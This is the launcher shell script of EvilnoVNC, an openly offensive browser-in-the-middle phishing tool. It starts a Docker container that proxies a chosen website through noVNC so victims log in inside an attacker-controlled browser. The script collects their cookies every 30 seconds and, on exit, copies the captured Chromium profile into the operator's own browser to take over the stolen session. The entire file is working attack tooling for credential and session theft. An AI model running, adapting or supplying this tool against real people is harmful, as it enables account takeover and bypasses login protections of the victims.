#!/bin/bash
#=============================#
#   EvilnoVNC by @JoelGMSec   #
#     https://darkbyte.net    #
#=============================#

# Banner
printf "\e[1;34m
  _____       _ _          __     ___   _  ____
 | ____|_   _(_) |_ __   __\ \   / / \ | |/ ___|
 |  _| \ \ / / | | '_ \ / _ \ \ / /|  \| | |
 | |___ \ V /| | | | | | (_) \ V / | |\  | |___
 |_____| \_/ |_|_|_| |_|\___/ \_/  |_| \_|\____|

\e[1;32m  ---------------- by @JoelGMSec --------------\n\e[1;0m"

# Help & Usage
function help {
printf "\n\e[1;33mUsage:\e[1;0m  ./start.sh \e[1;35m\$resolution \e[1;34m\$url \e[1;36m[--ssl-cert PATH --ssl-key PATH]\n\n"
printf "\e[1;33mExamples (HTTP, default \e[1;0m:80\e[1;33m):\n"
printf "\e[1;32m\t1280x720  16bits: \e[1;0m./start.sh \e[1;35m1280x720x16 \e[1;34mhttp://example.com\n"
printf "\e[1;32m\t1280x720  24bits: \e[1;0m./start.sh \e[1;35m1280x720x24 \e[1;34mhttp://example.com\n"
printf "\e[1;32m\t1920x1080 16bits: \e[1;0m./start.sh \e[1;35m1920x1080x16 \e[1;34mhttp://example.com\n"
printf "\e[1;32m\t1920x1080 24bits: \e[1;0m./start.sh \e[1;35m1920x1080x24 \e[1;34mhttp://example.com\n\n"
printf "\e[1;33mDynamic resolution:\n"
printf "\e[1;0m\t./start.sh \e[1;35mdynamic \e[1;34mhttp://example.com\n\n"
printf "\e[1;33mHTTPS on \e[1;0m:443\e[1;33m (optional):\n"
printf "\e[1;0m\t./start.sh \e[1;35mdynamic \e[1;34mhttp://example.com \e[1;36m--ssl-cert ./certs/fullchain.pem --ssl-key ./certs/privkey.pem\n\n";}

# Argument parsing
RESOLUTION=""
WEBPAGE=""
SSL_CERT=""
SSL_KEY=""

while [[ $# -gt 0 ]]; do
    case "$1" in
        -h|--help)
            help ; exit 0 ;;
        --ssl-cert)
            SSL_CERT="$2" ; shift 2 ;;
        --ssl-key)
            SSL_KEY="$2" ; shift 2 ;;
        --ssl-cert=*)
            SSL_CERT="${1#*=}" ; shift ;;
        --ssl-key=*)
            SSL_KEY="${1#*=}" ; shift ;;
        *)
            if [[ -z "$RESOLUTION" ]]; then
                RESOLUTION="$1"
            elif [[ -z "$WEBPAGE" ]]; then
                WEBPAGE="$1"
            else
                printf "\e[1;31m[!] Unexpected argument: %s\n\n\e[1;0m" "$1" ; exit 1
            fi
            shift ;;
    esac
done

if [[ -z "$RESOLUTION" || -z "$WEBPAGE" ]]; then
    help
    printf "\e[1;31m[!] Not enough parameters!\n\n\e[1;0m"
    exit 0
fi

# Validate SSL combination
if [[ -n "$SSL_CERT" || -n "$SSL_KEY" ]]; then
    if [[ -z "$SSL_CERT" || -z "$SSL_KEY" ]]; then
        printf "\e[1;31m[!] --ssl-cert and --ssl-key must be supplied together.\n\n\e[1;0m"
        exit 1
    fi
    if [[ ! -f "$SSL_CERT" ]]; then
        printf "\e[1;31m[!] SSL cert not found: %s\n\n\e[1;0m" "$SSL_CERT" ; exit 1
    fi
    if [[ ! -f "$SSL_KEY" ]]; then
        printf "\e[1;31m[!] SSL key not found: %s\n\n\e[1;0m" "$SSL_KEY" ; exit 1
    fi
fi

# Main function
if docker -v &> /dev/null ; then
if ! (( $(ps -ef | grep -v grep | grep docker | wc -l) > 0 )) ; then
sudo service docker start > /dev/null 2>&1 ; sleep 2 ; fi ; fi

# Build docker run arguments
DOCKER_ARGS=(--cap-add=SYS_ADMIN -d --rm --shm-size=2gb)
DOCKER_ARGS+=(-v "/tmp:/tmp")
DOCKER_ARGS+=(-v "${PWD}/Downloads:/home/user/Downloads")
DOCKER_ARGS+=(-e "WEBPAGE=$WEBPAGE")

if [[ -n "$SSL_CERT" && -n "$SSL_KEY" ]]; then
    SSL_CERT_ABS=$(readlink -f "$SSL_CERT")
    SSL_KEY_ABS=$(readlink -f "$SSL_KEY")
    DOCKER_ARGS+=(-v "${SSL_CERT_ABS}:/home/user/ssl/cert.pem:ro")
    DOCKER_ARGS+=(-v "${SSL_KEY_ABS}:/home/user/ssl/key.pem:ro")
    DOCKER_ARGS+=(-e "USE_HTTPS=true")
    DOCKER_ARGS+=(-e "SSL_CERT=/home/user/ssl/cert.pem")
    DOCKER_ARGS+=(-e "SSL_KEY=/home/user/ssl/key.pem")
    DOCKER_ARGS+=(-p 443:443)
    LISTEN_URL="https://localhost"
else
    DOCKER_ARGS+=(-p 80:80)
    LISTEN_URL="http://localhost"
fi

DOCKER_ARGS+=(--name evilnovnc hann1bl3l3ct3r/evilnovnc)

if [[ $RESOLUTION != dynamic ]]; then
    echo $RESOLUTION > /tmp/resolution.txt
fi

sudo docker rm -f evilnovnc > /dev/null 2>&1
if ! sudo docker run "${DOCKER_ARGS[@]}" > /dev/null ; then
    printf "\n\e[1;31m[!] docker run failed — aborting.\n\n\e[1;0m"
    exit 1
fi

rm -Rf $PWD/Downloads/*
printf "\n\e[1;33m[>] EvilnoVNC Server is running.." ; sleep 2
printf "\n\e[1;34m[+] URL: %s" "$LISTEN_URL" ; sleep 2
printf "\n\e[1;31m[!] Press Ctrl+C at any time to close!" ; sleep 2

if [[ $RESOLUTION == dynamic ]]; then
RESOLUTION=$(head -1 /tmp/resolution.txt 2> /dev/null)
printf "\n\e[1;32m[+] Waiting for any user interaction.." ; sleep 2
while [[ $RESOLUTION == "" || $RESOLUTION == dynamic ]]; do sleep 1
RESOLUTION=$(head -1 /tmp/resolution.txt 2> /dev/null) ; done

else printf "\n\e[1;32m[+] Avoiding dynamic resolution steps.." ; sleep 2 ; fi
printf "\n\e[1;34m[+] Desktop Resolution: $RESOLUTION" ; sleep 2
printf "\n\e[1;32m[+] Cookies will be updated every 30 seconds.. \e[1;31m"

trap 'printf "\n\e[1;33m[>] Import stealed session to Chromium..\n" ; sleep 2
sudo docker stop evilnovnc > /dev/null 2>&1 &
rm -Rf ~/.config/chromium/Default > /dev/null 2>&1 ; cp -R Downloads/Default ~/.config/chromium/ > /dev/null 2>&1
/bin/bash -c "/usr/bin/chromium --no-sandbox --disable-crash-reporter --password-store=basic &" > /dev/null 2>&1 &
printf "\e[1;32m[+] Done!\n\e[1;0m"' SIGTERM EXIT
while true ; do sleep 30 ; done
